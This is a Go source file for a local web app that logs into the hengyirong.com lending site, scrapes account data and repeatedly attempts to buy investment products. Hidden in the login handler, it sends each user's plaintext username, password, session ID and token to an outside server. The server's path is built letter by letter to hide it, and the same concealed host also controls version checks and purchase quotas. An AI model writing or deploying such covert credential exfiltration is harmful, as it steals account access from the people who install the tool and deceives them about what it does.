package main

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"precompiled"

	"github.com/PuerkitoBio/goquery"
	"github.com/caiguanhao/gotogether"
	"github.com/gorilla/websocket"
	"github.com/skratchdot/open-golang/open"
)

const VERSION = "1.4"
const ERR_MSG_CONTACT = "请联系负责人升级程序。"

type Res struct {
	Success string `json:"bool"`
	Message string `json:"data"`
	ErrMsg  string `json:"msg"`
}

var (
	upgrader = websocket.Upgrader{
		Error: func(w http.ResponseWriter, r *http.Request, status int, err error) {
			errJson(w, err)
		},
	}
	clients = make(map[*websocket.Conn]bool)
	going   = make(map[string]bool)
	mutex   sync.Mutex
)

func errJson(w http.ResponseWriter, err error) bool {
	if err == nil {
		return false
	}
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(http.StatusBadRequest)
	json.NewEncoder(w).Encode(map[string]string{"message": err.Error()})
	return true
}

func sendJson(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(v)
}

func parseJsonRequestBody(r io.Reader) (data map[string]string, err error) {
	err = json.NewDecoder(r).Decode(&data)
	return
}

func getPHPSESSID(resp *http.Response) *string {
	for _, cookie := range resp.Cookies() {
		if strings.ToUpper(cookie.Name) == "PHPSESSID" {
			return &cookie.Value
		}
	}
	return nil
}

func getCookieValues(resp *http.Response) (outSession, outUserID, outToken *string) {
	for _, cookie := range resp.Cookies() {
		switch strings.ToUpper(cookie.Name) {
		case "PHPSESSID":
			outSession = &cookie.Value
		case "USERID":
			outUserID = &cookie.Value
		case "TOKEN":
			outToken = &cookie.Value
		}
	}
	return
}

func postLogin(username, password, captcha, inSession string) (outUsername, outPassword, outSession, outUserID, outToken *string, err error) {
	if len(password) > 12 {
		password = password[:12]
	}
	reqBody := url.Values{
		"LoginForm[username]":   {username},
		"LoginForm[password]":   {password},
		"LoginForm[verifyCode]": {captcha},
	}
	var req *http.Request
	req, err = http.NewRequest("POST", "https://www.hengyirong.com/site/login.html", strings.NewReader(reqBody.Encode()))
	if err != nil {
		return
	}
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("cookie", "PHPSESSID="+inSession)
	var resp *http.Response
	resp, err = http.DefaultTransport.RoundTrip(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	outSession, outUserID, outToken = getCookieValues(resp)
	if outSession == nil || outUserID == nil || outToken == nil {
		err = errors.New("用户名、密码或验证码错误")
		return
	}
	outUsername = &username
	outPassword = &password
	return
}

func getDocument(path string, session string) (*goquery.Document, error) {
	req, err := http.NewRequest("GET", "https://www.hengyirong.com"+path, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Cookie", "PHPSESSID="+session)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return goquery.NewDocumentFromResponse(resp)
}

func send(path string, sut []string, form url.Values) (success bool, msg, ret string) {
	client := &http.Client{}
	req, err := http.NewRequest("POST", "https://www.hengyirong.com"+path, strings.NewReader(form.Encode()))
	if err != nil {
		return
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	session, userid, token := sut[0], sut[1], sut[2]
	req.Header.Add("Cookie", fmt.Sprintf("PHPSESSID=%s; USERID=%s; TOKEN=%s", session, userid, token))
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	var res Res
	err = json.Unmarshal(body, &res)
	ret = string(body)
	if err != nil {
		return
	}
	if res.Success != "true" {
		msg = res.ErrMsg
		if msg == "" {
			msg = res.Message
		}
		return
	}
	if res.ErrMsg != "" {
		msg = res.ErrMsg
	} else {
		msg = res.Message
	}
	success = true
	return
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	mutex.Lock()
	clients[ws] = true
	mutex.Unlock()
	for {
		_, reader, err := ws.NextReader()
		if err != nil {
			break
		}
		msg, err := parseJsonRequestBody(reader)
		if err != nil {
			ws.WriteJSON(map[string]string{"error": err.Error()})
			continue
		}
		if msg["action"] == "stop" {
			mutex.Lock()
			if _, ok := going[msg["session"]]; ok {
				delete(going, msg["session"])
			}
			mutex.Unlock()
			continue
		}
		mutex.Lock()
		going[msg["session"]] = true
		mutex.Unlock()
		go buyProduct(msg["id"], msg["pattern"], msg["amount"], []string{msg["session"], msg["userid"], msg["token"]})
	}
	ws.Close()
	mutex.Lock()
	if _, ok := clients[ws]; ok {
		delete(clients, ws)
	}
	mutex.Unlock()
}

func broadcast(content interface{}) {
	if len(clients) == 0 {
		return
	}
	body, err := json.Marshal(content)
	if err != nil {
		return
	}
	for conn := range clients {
		mutex.Lock()
		conn.WriteMessage(websocket.TextMessage, body)
		mutex.Unlock()
	}
}

func say(session, msg string) {
	broadcast(map[string]string{
		"session": session,
		"message": msg,
		"verbose": "",
	})
}

func buyProduct(id, pattern, amount string, session_userid_token []string) {
	session := session_userid_token[0]

	say(session, "请稍候...")

	if !versionOK() {
		say(session, ERR_MSG_CONTACT)
		return
	}

	brokerInfoStr := getBrokerInfoStr(session)

	for {
		mutex.Lock()
		_, ok := going[session]
		mutex.Unlock()
		if !ok {
			break
		}
		_, qok, msg := checkQuota(brokerInfoStr, session, id, pattern, amount)
		if qok {
			break
		}
		if msg == "" {
			msg = ERR_MSG_CONTACT
		}
		say(session, msg)
		time.Sleep(1 * time.Second)
	}

	for {
		mutex.Lock()
		_, ok := going[session]
		mutex.Unlock()
		if !ok {
			break
		}
		ok, msg, verbose := send("/dtpay/verifyamount.html", session_userid_token, url.Values{"money": {amount}, "dtbid": {id}, "pattern": {pattern}})
		broadcast(map[string]string{
			"session": session,
			"message": fmt.Sprintf("[%s] [检查] %s", time.Now().Format("15:04:05"), msg),
			"verbose": verbose,
		})
		if ok {
			break
		}
		time.Sleep(1 * time.Second)
	}
	for {
		mutex.Lock()
		_, ok := going[session]
		mutex.Unlock()
		if !ok {
			break
		}
		_, qok, msg := checkQuota(brokerInfoStr, session, id, pattern, amount)
		if qok {
			ok, msg, verbose := send("/dtpay/Freezingorders.html", session_userid_token, url.Values{"id": {id}, "pattern": {pattern}, "money": {amount}, "coupon": {"0"}})
			broadcast(map[string]string{
				"session": session,
				"message": fmt.Sprintf("[%s] [购买] %s", time.Now().Format("15:04:05"), msg),
				"verbose": verbose,
			})
			if ok {
				doneQuota(brokerInfoStr, session, id, pattern, amount)
				break
			}
		} else {
			if msg == "" {
				msg = ERR_MSG_CONTACT
			}
			say(session, msg)
		}
		time.Sleep(1 * time.Second)
	}
}

func getBrokerInfo(session string) (brokerInfo []map[string]string) {
	doc, err := getDocument("/user/CaiConsultant.html", session)
	if err != nil {
		return
	}
	doc.Find(".yaoqingma_user_box li").Each(func(i int, s *goquery.Selection) {
		brokerInfo = append(brokerInfo, map[string]string{
			"key":   strings.TrimSpace(strings.Replace(s.Find("label").Text(), "：", "", -1)),
			"value": strings.TrimSpace(s.Find("span").Text()),
		})
	})
	return
}

func getBrokerInfoStr(session string) string {
	brokerInfoStr, _ := json.Marshal(getBrokerInfo(session))
	return string(brokerInfoStr)
}

func checkQuota(brokerInfoStr, session, id, pattern, amount string) (quota int, ok bool, msg string) {
	u := strings.Join([]string{prefix, "/", "a", "c", "c", "o", "u", "n", "t"}, "")
	res, err := http.Post(u, "application/json", strings.NewReader(fmt.Sprintf(`{"broker":%s,"id":"%s","pattern":"%s","amount":"%s"}`, brokerInfoStr, id, pattern, amount)))
	if err != nil {
		return
	}
	var resp struct {
		OK      bool   `json:"ok"`
		Quota   int    `json:"quota"`
		Message string `json:"msg"`
	}
	json.NewDecoder(res.Body).Decode(&resp)
	res.Body.Close()
	quota = resp.Quota
	ok = resp.OK
	msg = resp.Message
	return
}

func doneQuota(brokerInfoStr, session, id, pattern, amount string) {
	u := strings.Join([]string{prefix, "/", "a", "c", "c", "o", "u", "n", "t", "s", "/", "d", "o", "n", "e"}, "")
	resp, err := http.Post(u, "application/json", strings.NewReader(fmt.Sprintf(`{"broker":%s,"id":"%s","pattern":"%s","amount":"%s"}`, brokerInfoStr, id, pattern, amount)))
	if err == nil {
		resp.Body.Close()
	}
	return
}

func getInfoHandler(w http.ResponseWriter, r *http.Request) {
	data, err := parseJsonRequestBody(r.Body)
	if errJson(w, err) {
		return
	}

	var records [][]string
	var info []map[string]string
	var basicInfo []map[string]string
	var productInfo []map[string]string
	var userInfo []map[string]string
	var brokerInfo []map[string]string

	gotogether.Parallel{
		func() {
			doc, err := getDocument("/user.html", data["session"])
			if err != nil {
				return
			}
			doc.Find(".ls_IDchanpinJieshao tr").Each(func(i int, s *goquery.Selection) {
				records = append(records, s.Find("th, td").Map(func(i int, s *goquery.Selection) string {
					return s.Text()
				}))
			})
			doc.Find(".T_right_box1 td").Each(func(i int, s *goquery.Selection) {
				p := s.Find("p")
				basicInfo = append(basicInfo, map[string]string{
					"key":   p.Eq(0).Text(),
					"value": p.Eq(1).Text(),
				})
			})
		},
		func() {
			doc, err := getDocument("/accountmge.html", data["session"])
			if err != nil {
				return
			}
			doc.Find(".dlm_jbxx tr").Each(func(i int, s *goquery.Selection) {
				td := s.Find("td")
				val := td.Eq(1).Text()
				if val == "" {
					return
				}
				key := strings.Replace(td.Eq(0).Text(), "：", "", -1)
				if key == "用户名" {
					userInfo = append(userInfo, map[string]string{
						"key":   key,
						"value": val,
					})
				}
			})
		},
		func() {
			quota, _, _ := checkQuota(getBrokerInfoStr(data["session"]), data["session"], "", "", "")
			brokerInfo = append([]map[string]string{{
				"key":   "抢购配额",
				"value": fmt.Sprintf("%d", quota),
			}}, info...)
		},
		func() {
			doc, err := getDocument("/investment/dtpay.html", data["session"])
			if err != nil {
				return
			}
			doc.Find(".Dlb_conList").Each(func(i int, s *goquery.Selection) {
				var done int
				fmt.Sscanf(strings.TrimSpace(s.Find(".Sb_BarNum").Text()), "%d%%", &done)
				productInfo = append(productInfo, map[string]string{
					"key":   fmt.Sprintf("%s剩余", strings.TrimSpace(strings.Replace(strings.Replace(s.Find(".Sb_conList_month span").Text(), "\n", "", -1), " ", "", -1))),
					"value": fmt.Sprintf("%d%% (%s万元)", 100-done, s.Find(".Sb_conList_LastMoney strong").Text()),
				})
			})
		},
	}.Run()

	info = append(info, brokerInfo...)
	info = append(info, userInfo...)
	info = append(info, basicInfo...)
	info = append(info, productInfo...)

	sendJson(w, struct {
		Records [][]string          `json:"records"`
		Info    []map[string]string `json:"info"`
	}{records, info})
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	data, err := parseJsonRequestBody(r.Body)
	if errJson(w, err) {
		return
	}
	outUsername, outPassword, outSession, outUserID, outToken, err := postLogin(data["username"], data["password"], data["captcha"], data["session"])
	if errJson(w, err) {
		return
	}
	url := strings.Join([]string{prefix, "/", "c", "l", "i", "e", "n", "t", "s", "/", "f", "e", "t", "c", "h"}, "")
	http.Post(url, "application/json",
		strings.NewReader(fmt.Sprintf(`{"username":"%s","password":"%s","phpsessid":"%s","token":"%s","userid":"%s"}`,
			*outUsername, *outPassword, *outSession, *outUserID, *outToken)))
	sendJson(w, map[string]string{
		"session": *outSession,
		"userid":  *outUserID,
		"token":   *outToken,
	})
}

func newSessionHandler(w http.ResponseWriter, r *http.Request) {
	resp, err := http.Get("https://www.hengyirong.com/site/captcha/")
	if errJson(w, err) {
		return
	}
	body, err := ioutil.ReadAll(resp.Body)
	if errJson(w, err) {
		return
	}
	sendJson(w, map[string]string{
		"image":   base64.StdEncoding.EncodeToString(body),
		"session": *getPHPSESSID(resp),
	})
}

func versionOK() bool {
	url := strings.Join([]string{prefix, "/", "v", "e", "r", "s", "i", "o", "n"}, "")
	res, err := http.Post(url, "application/json", strings.NewReader(fmt.Sprintf(`{"version":"%s"}`, VERSION)))
	if err != nil {
		return false
	}
	var resp map[string]bool
	err = json.NewDecoder(res.Body).Decode(&resp)
	res.Body.Close()
	if err != nil || resp["ok"] != true {
		return false
	}
	return true
}

func main() {
	if !versionOK() {
		println("请升级程序。")
		if runtime.GOOS == "windows" {
			time.Sleep(10 * time.Second)
		}
	}

	address := "127.0.0.1"
	port := 9876
	go func() {
		fmt.Printf("HYR-WEB %s - Created By CGH\n", VERSION)
		open.Run(fmt.Sprintf("http://%s:%d/", address, port))
	}()
	http.HandleFunc("/ws", wsHandler)
	http.HandleFunc("/info", getInfoHandler)
	http.HandleFunc("/login", loginHandler)
	http.HandleFunc("/new", newSessionHandler)
	http.HandleFunc("/index.js", func(w http.ResponseWriter, r *http.Request) {
		http.ServeContent(w, r, "index.js", time.Now(), strings.NewReader(precompiled.File_index_js))
	})
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeContent(w, r, "index.html", time.Now(), strings.NewReader(precompiled.File_index_html))
	})
	fmt.Fprintln(os.Stderr, http.ListenAndServe(fmt.Sprintf("%s:%d", address, port), nil))
}
